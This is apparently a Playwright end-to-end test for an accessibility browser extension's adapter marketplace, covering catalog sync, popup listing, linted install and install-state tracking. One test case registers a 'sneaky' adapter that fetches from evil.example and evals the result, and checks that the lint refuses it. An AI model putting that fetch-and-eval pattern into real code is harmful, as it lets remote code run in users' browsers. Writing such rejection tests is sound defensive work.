// Real browser, real unpacked personalized extension, real toolkit service:
// the extension's adapter-marketplace adoption end to end.
//
//   sync direction  — configuring the instance makes the extension publish
//                     its AA_TOOLS catalog under app "browser-extension".
//   fetch direction — an adapter registered on the instance with code shows
//                     up in the popup's marketplace list; installing it runs
//                     the lint and lands it in customSkills (and, when the
//                     user-scripts toggle allows, as a registered user
//                     script), and marks it installed on the instance.
//
// Needs the extension repository checked out next to this one (or
// AA_EXTENSION_DIR pointing at personalized-extension/extension). Opt-in:
// `npm run test:extension:e2e`. No LLM, no network beyond loopback.
import assert from 'node:assert/strict';
import http from 'node:http';
import { mkdtemp, rm } from 'node:fs/promises';
import { existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { chromium } from 'playwright';
import { createApp } from '../src/app.js';
import { fileStore } from '../src/store.js';
import { createToolkitHost } from '../src/toolkit-host.js';

const HERE = path.dirname(new URL(import.meta.url).pathname);
const REPO = path.resolve(HERE, '..', '..');
const EXT_DIR = process.env.AA_EXTENSION_DIR
  || path.resolve(REPO, '..', 'AI-for-Accessibility-Extension', 'personalized-extension', 'extension');
if (!existsSync(path.join(EXT_DIR, 'manifest.json'))) {
  console.log(`SKIP: extension not found at ${EXT_DIR} — clone AI-for-Accessibility-Extension next to this repo or set AA_EXTENSION_DIR.`);
  process.exit(0);
}

// Lint-clean marketplace payload (>= 30 chars, none of the denylist patterns).
const MARKET_CODE = 'document.documentElement.style.letterSpacing = "0.12em"; document.documentElement.style.wordSpacing = "0.08em";';

const dir = await mkdtemp(path.join(tmpdir(), 'extension-adapters-'));
const store = fileStore(dir), host = createToolkitHost({ store, geminiCaller: async () => { throw new Error('LLM disabled in test'); } });
const server = http.createServer(createApp({ store, adminPassword: 'test-admin', toolkitHost: host }));
await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
const base = `http://127.0.0.1:${server.address().port}`;
let context, profileDir;
try {
  const { token } = await (await fetch(base + '/admin/tokens', { method: 'POST', headers: { authorization: 'Bearer test-admin', 'content-type': 'application/json' }, body: JSON.stringify({ uid: 'ext-e2e' }) })).json();
  const api = (method, pathname, body, tok = token) => fetch(base + pathname, {
    method, headers: { authorization: `Bearer ${tok}`, ...(body ? { 'content-type': 'application/json' } : {}) },
    ...(body ? { body: JSON.stringify(body) } : {}),
  });

  // Playwright drives extensions through a persistent context (a throwaway
  // profile) so the unpacked extension loads; the service worker arrives as
  // a `serviceworker` event.
  profileDir = await mkdtemp(path.join(tmpdir(), 'extension-adapters-profile-'));
  context = await chromium.launchPersistentContext(profileDir, {
    // The headless shell cannot load extensions; channel 'chromium' runs the
    // full build in new-headless mode, which can.
    channel: 'chromium',
    headless: true,
    args: ['--disable-extensions-except=' + EXT_DIR, '--load-extension=' + EXT_DIR, '--no-first-run'],
  });
  let worker = context.serviceWorkers()[0];
  if (!worker) worker = await context.waitForEvent('serviceworker', { timeout: 60000 });
  const extId = new URL(worker.url()).host;

  // Configure remote mode from inside the service worker — the same keys the
  // options page writes. The storage.onChanged listener then runs
  // syncAdapterCatalog against the new instance.
  await worker.evaluate(async ([url, tok]) => {
    await chrome.storage.sync.set({ toolkitServerUrl: url, toolkitServerToken: tok });
  }, [base, token]);

  // Sync direction: the published catalog is the extension's AA_TOOLS list.
  const expected = await worker.evaluate(() => (globalThis.AA_TOOLS?.list || []).length);
  assert.ok(expected >= 40, `AA_TOOLS should carry the toolkit registry (got ${expected})`);
  let published = { json: null };
  const deadline = Date.now() + 30000;
  while (Date.now() < deadline) {
    const response = await api('GET', '/v1/adapters?app=browser-extension');
    published = { json: await response.json() };
    if (published.json.adapters.length >= expected) break;
    await new Promise(r => setTimeout(r, 500));
  }
  assert.ok(published.json.adapters.length >= expected,
    `extension should have published its ${expected} adapters (server has ${published.json.adapters.length})`);
  const ids = published.json.adapters.map(a => a.id);
  assert.ok(ids.includes('dark-mode'), 'known registry entry dark-mode should be listed');
  assert.ok(published.json.adapters.every(a => a.appId === 'browser-extension' && a.kind === 'data' && a.registeredBy === 'ext-e2e'));
  const appMeta = published.json.apps.find(a => a.appId === 'browser-extension');
  assert.equal(appMeta.name, 'Browser Extension');

  // Fetch direction: another developer registers a code adapter for this app.
  const { token: devToken } = await (await fetch(base + '/admin/tokens', { method: 'POST', headers: { authorization: 'Bearer test-admin', 'content-type': 'application/json' }, body: JSON.stringify({ uid: 'marketplace-dev' }) })).json();
  const registered = await api('POST', '/v1/adapters', {
    appId: 'browser-extension', id: 'wide-spacing', name: 'Wide Spacing',
    description: 'Widens letter and word spacing.', supportAreas: ['vision', 'reading'], code: MARKET_CODE,
  }, devToken);
  assert.equal(registered.status, 201);

  // The popup (an extension page, like a user would open) lists and installs.
  const popup = await context.newPage();
  popup.setDefaultTimeout(20000);
  await popup.goto(`chrome-extension://${extId}/popup/popup.html`);
  const listing = await popup.evaluate(() => chrome.runtime.sendMessage({ type: 'marketplaceList' }));
  assert.equal(listing.remote, true);
  const wide = listing.adapters.find(a => a.id === 'wide-spacing');
  assert.ok(wide && wide.kind === 'code', 'the registered code adapter should appear in the popup marketplace');

  const install = await popup.evaluate(() => chrome.runtime.sendMessage({
    type: 'marketplaceInstall', appId: 'browser-extension', id: 'wide-spacing',
    name: 'Wide Spacing', description: 'Widens letter and word spacing.', supportAreas: ['vision', 'reading'],
  }));
  assert.equal(install.success, true, JSON.stringify(install));
  assert.equal(install.skillId, 'mk-browser-extension-wide-spacing');

  const skills = await popup.evaluate(() => chrome.runtime.sendMessage({ type: 'getActiveSkills' }));
  const saved = skills.customSkills.find(s => s.id === 'mk-browser-extension-wide-spacing');
  assert.ok(saved, 'installed adapter must land in customSkills');
  assert.equal(saved.code, MARKET_CODE);
  assert.equal(saved.enabled, true);
  assert.deepEqual(saved.marketplace, { appId: 'browser-extension', id: 'wide-spacing', sha256: (await (await api('GET', '/v1/adapters/browser-extension/wide-spacing/code')).json()).sha256 });

  // The existing reconcile path owns actual registration; assert the user
  // script when the profile allows it (the toggle is off in a fresh profile,
  // which the extension surfaces via getUserScriptsStatus instead).
  const scriptId = await worker.evaluate(async (id) => {
    try {
      const scripts = await chrome.userScripts.getScripts();
      return scripts.some(s => s.id === `aa-custom-${id}`);
    } catch { return 'toggle-off'; }
  }, 'mk-browser-extension-wide-spacing');
  if (scriptId === true) assert.ok(true); else console.log(`  (user-scripts toggle off in the test profile: customSkills record is the source of truth, ${scriptId})`);

  // The install arm also records install state on the instance.
  const after = await (await api('GET', '/v1/adapters?app=browser-extension&installed=1')).json();
  assert.ok(after.adapters.some(a => a.id === 'wide-spacing' && a.installed), 'install state should be visible to the instance');

  // And the newly installed custom skill is part of what the extension
  // publishes, so the catalog re-synced to include it.
  const republished = await (await api('GET', '/v1/adapters?app=browser-extension')).json();
  assert.ok(republished.adapters.some(a => a.id === 'mk-browser-extension-wide-spacing'),
    'installed marketplace adapter should appear in the published catalog');

  // A marketplace adapter that fails the lint is refused, not installed.
  const bad = await api('POST', '/v1/adapters', {
    appId: 'browser-extension', id: 'sneaky', name: 'Sneaky', code: 'const x = fetch("https://evil.example"); eval(x); // padding padding padding padding',
  }, devToken);
  assert.equal(bad.status, 201);
  const refused = await popup.evaluate(() => chrome.runtime.sendMessage({ type: 'marketplaceInstall', appId: 'browser-extension', id: 'sneaky', name: 'Sneaky' }));
  assert.equal(refused.success, undefined);
  assert.match(refused.error, /lint/i);
  const stillSafe = await popup.evaluate(() => chrome.runtime.sendMessage({ type: 'getActiveSkills' }));
  assert.ok(!stillSafe.customSkills.some(s => s.id === 'mk-browser-extension-sneaky'), 'lint-rejected code must not install');

  console.log('Extension marketplace e2e passed: catalog sync (AA_TOOLS -> /v1/adapters/sync), popup list, linted install into customSkills, install state on the instance, and lint rejection.');
} finally {
  await context?.close();
  if (profileDir) await rm(profileDir, { recursive: true, force: true });
  await new Promise(resolve => server.close(resolve));
  await rm(dir, { recursive: true, force: true });
}
